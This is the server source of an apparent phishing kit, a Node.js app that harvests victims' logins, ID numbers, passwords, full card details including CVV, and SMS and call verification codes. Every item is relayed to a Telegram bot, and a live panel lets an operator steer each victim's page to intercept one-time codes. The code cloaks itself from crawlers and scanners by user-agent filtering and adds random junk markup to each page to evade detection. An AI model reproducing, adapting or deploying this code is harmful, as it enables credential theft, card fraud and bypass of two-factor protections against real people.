require('dotenv').config();
const express = require('express');
const bodyParser = require('body-parser');
const fetch = require('node-fetch');
const path = require('path');
const http = require('http');
const socketIo = require('socket.io');
const fs = require('fs');
const session = require('express-session');
const cookieParser = require('cookie-parser');

const app = express();
const server = http.createServer(app);
const io = socketIo(server);

const PORT = process.env.PORT || 3000;
let BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
let CHAT_ID = process.env.TELEGRAM_CHAT_ID;

app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());
app.use(cookieParser());

// Persistent victims storage
const VICTIMS_FILE = path.join(__dirname, 'victims_store.json');
let victims = {};

function loadVictims() {
    if (fs.existsSync(VICTIMS_FILE)) {
        try {
            victims = JSON.parse(fs.readFileSync(VICTIMS_FILE, 'utf8'));
            // Mark all as offline since server just restarted
            Object.values(victims).forEach(v => { v.status = 'offline'; });
            console.log(`Loaded ${Object.keys(victims).length} stored sessions.`);
        } catch (e) {
            console.error('Failed to load victims store:', e.message);
            victims = {};
        }
    }
}

function saveVictims() {
    try {
        fs.writeFileSync(VICTIMS_FILE, JSON.stringify(victims, null, 2));
    } catch (e) {
        console.error('Failed to save victims store:', e.message);
    }
}

loadVictims();

// Anti-bot middleware (only for GET page requests, not POST form data or static files)
app.use((req, res, next) => {
    // Only check GET requests for HTML pages (not form POSTs, not static assets, not socket.io)
    if (req.method !== 'GET') return next();
    if (req.path.startsWith('/socket.io')) return next();
    if (req.path.startsWith('/js/') || req.path.startsWith('/js-core/') || req.path.startsWith('/css/') || req.path.startsWith('/images/') || req.path.startsWith('/files/')) return next();
    
    const ua = req.get('user-agent') || '';
    // Match only real bots/crawlers — NOT regular browsers
    const botPatterns = /Googlebot|bingbot|Slurp|DuckDuckBot|Baiduspider|YandexBot|Sogou|python-requests|python\/|curl\/|wget\/|headlesschrome|phantomjs/i;
    
    if (botPatterns.test(ua)) {
        return res.status(404).send('Not Found');
    }
    
    next();
});

app.use(session({
    secret: 'ctrl-secret-key-x9f2',
    resave: false,
    saveUninitialized: true,
    cookie: { secure: false }
}));

// Set victim_id cookie server-side so it's always present before any form submission
app.use((req, res, next) => {
    if (!req.cookies.victim_id && req.session) {
        const vid = req.sessionID;
        res.cookie('victim_id', vid, { path: '/', httpOnly: false, sameSite: 'Lax' });
    }
    next();
});

app.use(express.static(path.join(__dirname, 'public')));

// Helper to get victim ID from request
function getVictimId(req) {
    return req.cookies.victim_id || req.sessionID;
}

function ensureVictim(vId, ip) {
    if (!victims[vId]) {
        victims[vId] = {
            id: vId,
            ip: ip || 'unknown',
            data: { niks: [], passwords: [], cards: [], sms_codes: [], call_codes: [] },
            lastSeen: new Date(),
            history: [],
            status: 'offline'
        };
    }
}

// BIN Lookup helper
async function getBinInfo(bin) {
    try {
        const response = await fetch(`https://data.handyapi.com/bin/${bin}`);
        if (response.ok) {
            const data = await response.json();
            if (data.Status === 'SUCCESS') {
                return {
                    scheme: data.Scheme || 'Unknown',
                    type: data.Type || 'Unknown',
                    brand: data.CardTier || 'Unknown',
                    bank: data.Issuer || 'Unknown',
                    country: data.Country ? data.Country.Name : 'Unknown'
                };
            }
        }
    } catch (e) {
        console.error('BIN lookup error:', e);
    }
    return null;
}

// Helper to send Telegram message
async function sendTelegram(message) {
    if (!BOT_TOKEN || !CHAT_ID) return;
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    try {
        await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'HTML'
            })
        });
    } catch (err) {
        console.error('Telegram error:', err);
    }
}

// Socket.io for Live Panel
io.on('connection', (socket) => {
    socket.on('admin_join', () => {
        socket.join('admins');
        socket.emit('victims_update', Object.values(victims));
    });

    socket.on('victim_join', (data) => {
        const vId = data.id || socket.id;
        ensureVictim(vId, socket.handshake.address);
        victims[vId].status = 'online';
        victims[vId].lastPage = data.page;
        victims[vId].lastSeen = new Date();
        victims[vId].socketId = socket.id;
        victims[vId].userAgent = socket.handshake.headers['user-agent'];
        socket.vId = vId;
        socket.join(vId);
        saveVictims();
        io.to('admins').emit('victims_update', Object.values(victims));
    });

    socket.on('admin_command', (data) => {
        const { victimId, command, page } = data;
        if (victims[victimId]) {
            victims[victimId].lastAction = page || command;
        }
        io.to(victimId).emit('command', { command, page });
    });

    socket.on('disconnect', () => {
        if (socket.vId && victims[socket.vId]) {
            victims[socket.vId].status = 'offline';
            victims[socket.vId].lastSeen = new Date();
            saveVictims();
            io.to('admins').emit('victims_update', Object.values(victims));
        }
    });
});

// Luhn Algorithm helper
function luhnCheck(num) {
    let digits = num.replace(/\D/g, '');
    if (digits.length < 13) return false;
    let sum = 0, alt = false;
    for (let i = digits.length - 1; i >= 0; i--) {
        let n = parseInt(digits[i], 10);
        if (alt) { n *= 2; if (n > 9) n -= 9; }
        sum += n; alt = !alt;
    }
    return sum % 10 === 0;
}

// Routes
app.post('/login', async (req, res) => {
    const { nik } = req.body;
    const vId = getVictimId(req);
    ensureVictim(vId, req.ip);
    const entry = { value: nik, timestamp: new Date(), action: victims[vId].lastAction || 'initial' };
    victims[vId].data.niks.push(entry);
    victims[vId].lastPage = 'login';
    victims[vId].lastSeen = new Date();
    saveVictims();
    await sendTelegram(`<b>🔔 Login</b>\n<b>Login:</b> <code>${nik}</code>\n<b>Context:</b> <code>${entry.action}</code>\n<b>ID:</b> <code>${vId}</code>`);
    io.to('admins').emit('victims_update', Object.values(victims));
    res.redirect('/password');
});

app.post('/password', async (req, res) => {
    const { login, password } = req.body;
    const vId = getVictimId(req);
    ensureVictim(vId, req.ip);
    const entry = { value: password, login, timestamp: new Date(), action: victims[vId].lastAction || 'initial' };
    victims[vId].data.passwords.push(entry);
    victims[vId].lastPage = 'password';
    victims[vId].lastSeen = new Date();
    saveVictims();
    await sendTelegram(`<b>🔑 Password</b>\n<b>Login:</b> <code>${login}</code>\n<b>Pass:</b> <code>${password}</code>\n<b>Context:</b> <code>${entry.action}</code>\n<b>ID:</b> <code>${vId}</code>`);
    io.to('admins').emit('victims_update', Object.values(victims));
    res.redirect('/wait');
});

app.post('/card', async (req, res) => {
    const { card_number, card_expiry, card_cvv } = req.body;
    const vId = getVictimId(req);

    if (!luhnCheck(card_number)) {
        return res.status(400).send('Invalid card number');
    }

    let binInfo = null;
    const binStr = card_number.replace(/\D/g, '').substring(0, 6);
    if (binStr.length >= 6) binInfo = await getBinInfo(binStr);

    ensureVictim(vId, req.ip);
    const entry = { card_number, card_expiry, card_cvv, binInfo, timestamp: new Date(), action: victims[vId].lastAction || 'initial' };
    victims[vId].data.cards.push(entry);
    victims[vId].lastPage = 'card';
    victims[vId].lastSeen = new Date();
    saveVictims();

    let msg = `<b>💳 Card (${entry.action})</b>\n<b>Number:</b> <code>${card_number}</code>\n<b>Expiry:</b> <code>${card_expiry}</code>\n<b>CVV:</b> <code>${card_cvv}</code>\n<b>ID:</b> <code>${vId}</code>`;
    if (binInfo) msg += `\n\n<b>🏦 BIN:</b> ${binInfo.bank} | ${binInfo.brand} | ${binInfo.type} | ${binInfo.country}`;

    await sendTelegram(msg);
    io.to('admins').emit('victims_update', Object.values(victims));
    res.redirect('/sms');
});

app.post('/sms', async (req, res) => {
    const { sms_code } = req.body;
    const vId = getVictimId(req);
    ensureVictim(vId, req.ip);
    const entry = { value: sms_code, timestamp: new Date(), action: victims[vId].lastAction || 'initial' };
    victims[vId].data.sms_codes.push(entry);
    victims[vId].lastPage = 'sms';
    victims[vId].lastSeen = new Date();
    saveVictims();
    await sendTelegram(`<b>💬 SMS Code (${entry.action})</b>\n<b>Code:</b> <code>${sms_code}</code>\n<b>ID:</b> <code>${vId}</code>`);
    io.to('admins').emit('victims_update', Object.values(victims));
    res.redirect('/wait');
});

app.post('/app-confirm', async (req, res) => {
    const vId = getVictimId(req);
    ensureVictim(vId, req.ip);
    victims[vId].lastSeen = new Date();
    saveVictims();
    await sendTelegram(`<b>📲 App Confirmation</b>\n<b>ID:</b> <code>${vId}</code>`);
    io.to('admins').emit('victims_update', Object.values(victims));
    res.send('OK');
});

app.post('/call-confirm', async (req, res) => {
    const { call_code } = req.body;
    const vId = getVictimId(req);
    ensureVictim(vId, req.ip);
    const entry = { value: call_code, timestamp: new Date(), action: victims[vId].lastAction || 'initial' };
    victims[vId].data.call_codes.push(entry);
    victims[vId].lastSeen = new Date();
    saveVictims();
    await sendTelegram(`<b>📞 Call Code (${entry.action})</b>\n<b>Code:</b> <code>${call_code}</code>\n<b>ID:</b> <code>${vId}</code>`);
    io.to('admins').emit('victims_update', Object.values(victims));
    res.send('OK');
});

// Admin API to update .env
app.post('/admin/config', (req, res) => {
    const { token, chatId } = req.body;
    if (token && chatId) {
        BOT_TOKEN = token;
        CHAT_ID = chatId;
        
        const envPath = path.join(__dirname, '.env');
        let envContent = '';
        if (fs.existsSync(envPath)) {
            envContent = fs.readFileSync(envPath, 'utf8');
        } else {
            envContent = `TELEGRAM_BOT_TOKEN=\nTELEGRAM_CHAT_ID=\n`;
        }
        
        if (envContent.includes('TELEGRAM_BOT_TOKEN=')) {
            envContent = envContent.replace(/TELEGRAM_BOT_TOKEN=.*/, `TELEGRAM_BOT_TOKEN=${token}`);
        } else {
            envContent += `TELEGRAM_BOT_TOKEN=${token}\n`;
        }

        if (envContent.includes('TELEGRAM_CHAT_ID=')) {
            envContent = envContent.replace(/TELEGRAM_CHAT_ID=.*/, `TELEGRAM_CHAT_ID=${chatId}`);
        } else {
            envContent += `TELEGRAM_CHAT_ID=${chatId}\n`;
        }
        
        fs.writeFileSync(envPath, envContent);
        res.json({ success: true });
    } else {
        res.status(400).json({ success: false });
    }
});

app.get('/admin/config', (req, res) => {
    res.json({ token: BOT_TOKEN, chatId: CHAT_ID });
});

// Serve HTML files with amorphic injection
app.get('/:page', (req, res) => {
    const page = req.params.page;
    if (page === 'admin') {
         return res.sendFile(path.join(__dirname, 'public', `admin.html`));
    }
    
    const filePath = path.join(__dirname, 'public', `${page}.html`);
    if (fs.existsSync(filePath)) {
        let content = fs.readFileSync(filePath, 'utf8');
        
        // Amorphic injection: Add random hidden div and random comments
        const randomId = 'id-' + Math.random().toString(36).substring(2, 9);
        const randomVal = Math.random().toString(36).substring(2, 15);
        const garbage = `<div id="${randomId}" style="display:none">${randomVal}</div><!-- ${randomVal.split('').reverse().join('')} -->`;
        
        content = content.replace('</body>', `${garbage}\n</body>`);
        
        // Randomize class names in every response (basic polymorphism)
        // This is more complex, let's start with just the garbage injection
        
        res.send(content);
    } else {
        res.status(404).send('Page not found');
    }
});

app.get('/', (req, res) => {
    const filePath = path.join(__dirname, 'public', 'index.html');
    let content = fs.readFileSync(filePath, 'utf8');
    const randomId = 'id-' + Math.random().toString(36).substring(2, 9);
    const randomVal = Math.random().toString(36).substring(2, 15);
    const garbage = `<div id="${randomId}" style="display:none">${randomVal}</div><!-- ${randomVal.split('').reverse().join('')} -->`;
    content = content.replace('</body>', `${garbage}\n</body>`);
    res.send(content);
});

server.listen(PORT, '0.0.0.0', () => {
    console.log(`Server running on port ${PORT}`);
});
